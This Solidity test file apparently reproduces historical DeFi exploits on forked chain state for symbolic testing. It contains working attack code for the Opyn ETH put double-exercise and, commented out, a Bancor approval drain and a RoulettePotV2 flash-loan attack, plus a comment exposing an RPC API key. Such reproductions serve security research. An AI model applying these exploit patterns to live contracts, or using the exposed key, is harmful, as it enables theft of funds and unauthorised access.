pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
@Analysis 
https://medium.com/opyn/opyn-eth-put-exploit-post-mortem-1a009e3347a8

rm -rf out/contract.sol && forge build --ast && ./hevm test --rpc https://eth-mainnet.g.alchemy.com/v2/P-x0L9coIqzuhfI091DXitR7BzYbABFA --number 10592516 --max-iterations 1000000000000000
@Transaction
0x56de6c4bd906ee0c067a332e64966db8b1e866c7965c044163a503de6ee6552a*/
// contract ContractTest is Test {
//     IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);

//     address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;

//     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

//     IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

//     function setUp() public {
//         // cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
//     }

//     // function check_attack(uint256 _amtToCreate, uint256 _amtCollateral, uint256 _amtToExercise) public {
//     function prove_attack(uint256 _amtCollateral) public {
//     // function test_attack() public {
//         // uint256 _amtToCreate = 68504683582;
//         // uint256 _amtCollateral = 33;
//         // uint256 _amtToExercise = 0;
//         // uint256 _amtToCreate = 62090718045278447341370480751728569682300484420350497668790222243412818179804;
//         // uint256 _amtCollateral = 68504683582;
//         // uint256 _amtToExercise = 0;
//         uint256 _amtToCreate = 300_000_000;
//         uint256 _amtToExercise = 600_000_000;


//         // uint256 _amtCollateral = 9_800_000_000;
//         cheats.startPrank(attacker);

//         uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
//         console.log("Attacker USDC balance before is    ", balBefore);
//         console.log("------EXPLOIT-----");

//         //Adds ERC20 collateral, and mints new oTokens in one step
//         uint256 amtToCreate = _amtToCreate;
//         uint256 amtCollateral = _amtCollateral;

//         // TODO: Add specific assumptions about _amtCollateral to prevent
//         // internal reverts in opyn.addERC20CollateralOption.
//         // For example:
//         // cheats.assume(_amtCollateral > YOUR_MINIMUM_THRESHOLD_HERE);
//         // cheats.assume((_amtCollateral * SOME_RATIO_FACTOR) / SCALE >= _amtToCreate);

//         opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

//         //create an arry of vaults
//         address payable[] memory _arr = new address payable[](2);
//         _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);
//         _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

//         //The attacker excercises the put option on two different valuts using the same msg.value
//         opyn.exercise{value: 30 ether}(_amtToExercise, _arr);

//         //remove share of underlying after excercise
//         opyn.removeUnderlying();

//         uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
//         assert(!(balAfter - balBefore >= 10050));
//         // assert(!(balAfter - balBefore >= 10000));
//         console.log("Attacker USDC balance after is     ", balAfter);
//         console.log("Attacker profit is                  ", balAfter - balBefore);
//     }
// }







// contract OptionsContract is Ownable, ERC20 {

//     /* represents floting point numbers, where number = value * 10 ** exponent
//     i.e 0.1 = 10 * 10 ** -3 */
//     struct Number {
//         uint256 value;
//         int32 exponent;
//     }

//     // Keeps track of the weighted collateral and weighted debt for each vault.
//     struct Vault {
//         uint256 collateral;
//         uint256 oTokensIssued;
//         uint256 underlying;
//         bool owned;
//     }

//     mapping(address => Vault) internal vaults;

//     address payable[] internal vaultOwners;

//     /* 16 means 1.6. The minimum ratio of a Vault's collateral to insurance promised.
//     The ratio is calculated as below:
//     vault.collateral / (Vault.oTokensIssued * strikePrice) */
//     Number public minCollateralizationRatio;

//     // The amount of insurance promised per oToken
//     Number public strikePrice;

//     // The collateral asset
//     IERC20 public collateral;

//     // The asset being protected by the insurance
//     IERC20 public underlying;

//     // The asset in which insurance is denominated in.
//     IERC20 public strike;

//     // The Oracle used for the contract
//     CompoundOracleInterface public COMPOUND_ORACLE;
    
        
//     function getVault(address payable vaultOwner)
//         public
//         view
//         returns (uint256, uint256, uint256, bool)
//     {
//         Vault storage vault = vaults[vaultOwner];
//         return (
//             vault.collateral,
//             vault.oTokensIssued,
//             vault.underlying,
//             vault.owned
//         );
//     }
    
//     function addERC20CollateralOption(
//         uint256 amtToCreate,
//         uint256 amtCollateral,
//         address receiver
//     ) public {
//         addERC20Collateral(msg.sender, amtCollateral);
//         issueOTokens(amtToCreate, receiver);
//     }
    
//     function addERC20Collateral(address payable vaultOwner, uint256 amt)
//         public
//         notExpired
//         returns (uint256)
//     {
//         require(
//             collateral.transferFrom(msg.sender, address(this), amt),
//             "Could not transfer in collateral tokens"
//         );
//         require(hasVault(vaultOwner), "Vault does not exist");

//         emit ERC20CollateralAdded(vaultOwner, amt, msg.sender);
//         return _addCollateral(vaultOwner, amt);
//     }
//     function _addCollateral(address payable vaultOwner, uint256 amt)
//         internal
//         notExpired
//         returns (uint256)
//     {
//         Vault storage vault = vaults[vaultOwner];
//         vault.collateral = vault.collateral.add(amt);

//         return vault.collateral;
//     }
   
//     function issueOTokens(uint256 oTokensToIssue, address receiver)
//         public
//         notExpired
//     {
//         //check that we're properly collateralized to mint this number, then call _mint(address account, uint256 amount)
//         require(hasVault(msg.sender), "Vault does not exist");

//         Vault storage vault = vaults[msg.sender];

//         // checks that the vault is sufficiently collateralized
//         uint256 newOTokensBalance = vault.oTokensIssued.add(oTokensToIssue);
//         require(isSafe(vault.collateral, newOTokensBalance), "unsafe to mint");

//         // issue the oTokens
//         vault.oTokensIssued = newOTokensBalance;
//         _mint(receiver, oTokensToIssue);

//         emit IssuedOTokens(receiver, oTokensToIssue, msg.sender);
//         return;
//     }
    
    
//     function isSafe(uint256 collateralAmt, uint256 oTokensIssued)
//         internal
//         view
//         returns (bool)
//     {
//         // get price from Oracle
//         uint256 collateralToEthPrice = getPrice(address(collateral));
//         uint256 strikeToEthPrice = getPrice(address(strike));

//         // check `oTokensIssued * minCollateralizationRatio * strikePrice <= collAmt * collateralToStrikePrice`
//         uint256 leftSideVal = oTokensIssued
//             .mul(minCollateralizationRatio.value)
//             .mul(strikePrice.value);
//         int32 leftSideExp = minCollateralizationRatio.exponent +
//             strikePrice.exponent;

//         uint256 rightSideVal = (collateralAmt.mul(collateralToEthPrice)).div(
//             strikeToEthPrice
//         );
//         int32 rightSideExp = collateralExp;

//         uint256 exp = 0;
//         bool stillSafe = false;

//         // this if stmt is used just for precision
//         if (rightSideExp < leftSideExp) {
//             exp = uint256(leftSideExp - rightSideExp);
//             stillSafe = leftSideVal.mul(10**exp) <= rightSideVal;
//         } else {
//             exp = uint256(rightSideExp - leftSideExp);
//             stillSafe = leftSideVal <= rightSideVal.mul(10**exp);
//         }

//         return stillSafe;
//     }
    
//     /**
//      * @notice This function gets the price ETH (wei) to asset price.
//      * @param asset The address of the asset to get the price of
//      */
//     function getPrice(address asset) internal view returns (uint256) {
//         if (address(collateral) == address(strike)) {
//             return 1;
//         } else if (asset == address(0)) {
//             return (10**18);
//         } else {
//             return COMPOUND_ORACLE.getPrice(asset);
//         }
//     }
    
// }







contract ContractTest is Test {
    IOpyn opyn = IOpyn(0x951D51bAeFb72319d9FBE941E1615938d89ABfe2);

    address attacker = 0xe7870231992Ab4b1A01814FA0A599115FE94203f;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function setUp() public {
        // cheats.createSelectFork("mainnet", 10_592_516); //fork mainnet at block 10592516
    }

    // function check_attack(uint256 _amtToCreate, uint256 _amtCollateral, uint256 _amtToExercise) public {
    function prove_attack(uint256 _amtCollateral) public {
    // function test_attack() public {
        // uint256 _amtToCreate = 68504683582;
        // uint256 _amtCollateral = 33;
        // uint256 _amtToExercise = 0;
        // uint256 _amtToCreate = 62090718045278447341370480751728569682300484420350497668790222243412818179804;
        // uint256 _amtCollateral = 68504683582;
        // uint256 _amtToExercise = 0;
        uint256 _amtToCreate = 300_000_000;
        uint256 _amtToExercise = 600_000_000;


        // uint256 _amtCollateral = 9_800_000_000;
        cheats.startPrank(attacker);

        uint256 balBefore = usdc.balanceOf(attacker) / 1e6;
        console.log("Attacker USDC balance before is    ", balBefore);
        console.log("------EXPLOIT-----");

        //Adds ERC20 collateral, and mints new oTokens in one step
        uint256 amtToCreate = _amtToCreate;
        uint256 amtCollateral = _amtCollateral;

        // TODO: Add specific assumptions about _amtCollateral to prevent
        // internal reverts in opyn.addERC20CollateralOption.
        // For example:
        // cheats.assume(_amtCollateral > YOUR_MINIMUM_THRESHOLD_HERE);
        // cheats.assume((_amtCollateral * SOME_RATIO_FACTOR) / SCALE >= _amtToCreate);

        opyn.addERC20CollateralOption(amtToCreate, amtCollateral, attacker);

        //create an arry of vaults
        address payable[] memory _arr = new address payable[](2);
        _arr[0] = payable(0xe7870231992Ab4b1A01814FA0A599115FE94203f);
        _arr[1] = payable(0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2);

        //The attacker excercises the put option on two different valuts using the same msg.value
        opyn.exercise{value: 30 ether}(_amtToExercise, _arr);

        //remove share of underlying after excercise
        opyn.removeUnderlying();

        uint256 balAfter = usdc.balanceOf(attacker) / 1e6;
        assert(!(balAfter - balBefore >= 10050));
        // assert(!(balAfter - balBefore >= 10000));
        console.log("Attacker USDC balance after is     ", balAfter);
        console.log("Attacker profit is                  ", balAfter - balBefore);
    }
}




// interface IBancor {
//     function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;
// }

// contract BancorExploit is Test {
//     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
//     address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
//     address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
//     address attacker = address(this);
//     IERC20 XBPToken = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);

//     IBancor bancorContract = IBancor(bancorAddress);

//     function setUp() public {
//         // cheats.createSelectFork("mainnet", 10_307_563); // fork mainnet at 10307563
//     }

//     function prove_safeTransfer() public {
//         emit log_named_uint(
//             "Victim XBPToken Allowance to Bancor Contract : ", (XBPToken.allowance(victim, bancorAddress) / 1 ether)
//         );
//         emit log_named_uint("[Before Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
//         emit log_named_uint("[Before Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);

//         cheats.prank(address(this));
//         bancorContract.safeTransferFrom(
//             IERC20(address(XBPToken)),
//             victim,
//             attacker,
//             XBPToken.balanceOf(victim) //905987977635678910008152
//         );
//         assert(XBPToken.balanceOf(attacker) == 905987977635678910008152);
//         emit log_string("--------------------------------------------------------------");
//         emit log_named_uint("[After Attack]Victim XBPToken Balance : ", (XBPToken.balanceOf(victim)) / 1 ether);
//         emit log_named_uint("[After Attack]Attacker XBPToken Balance : ", (XBPToken.balanceOf(attacker)) / 1 ether);
//     }
// }





// interface IRoulettePotV2 {
//     function finishRound() external;
//     function swapProfitFees() external;
// }

// contract RoulettePotV2 is Test {
//     uint256 blocknumToForkFrom = 45_668_285;
//     address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
//     address internal constant PancakeSwap = 0x824eb9faDFb377394430d2744fa7C42916DE3eCe;
//     address internal constant RoulettePotV2 = 0xf573748637E0576387289f1914627d716927F90f;
//     address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
//     address internal constant LINK = 0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD;

//     function setUp() public {
//         // vm.createSelectFork("bsc", blocknumToForkFrom);
//         //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
//         // fundingToken = address(WBNB);
//     }

//     function prove_Exploit() public {
//         address recipient = PancakeSwap;
//         uint256 amount0 = 0;
//         uint256 amount1 = 4_203_732_130_200_000_000_000;
//         bytes memory data = abi.encode(amount1);
//         IPancakeV3Pool(PancakeV3Pool).flash(recipient, amount0, amount1, data);
//     }

//     function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes memory data) external {
//         console.log("Attacker WBNB balance before is     ", IERC20(WBNB).balanceOf(address(this)));

//         uint256 amount = abi.decode(data, (uint256));

//         uint256 amount0Out = 0;
//         uint256 amount1Out = 17_527_795_283_271_427_200_665;
//         address to = address(this);
//         IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

//         IRoulettePotV2(RoulettePotV2).finishRound();

//         IRoulettePotV2(RoulettePotV2).swapProfitFees();

//         uint256 balance = IERC20(LINK).balanceOf(address(this));
//         IERC20(LINK).transfer(PancakeSwap, balance);

//         amount0Out = 4_243_674_096_928_729_821_513;
//         amount1Out = 0;
//         IUniswapV2Pair(PancakeSwap).swap(amount0Out, amount1Out, to, new bytes(0));

//         IERC20(WBNB).transfer(PancakeV3Pool, amount+fee1);
//         assert(IERC20(WBNB).balanceOf(address(this))==39521593515709821513); 
//         console.log("Attacker WBNB balance after is     ", IERC20(WBNB).balanceOf(address(this)));
//     }
// }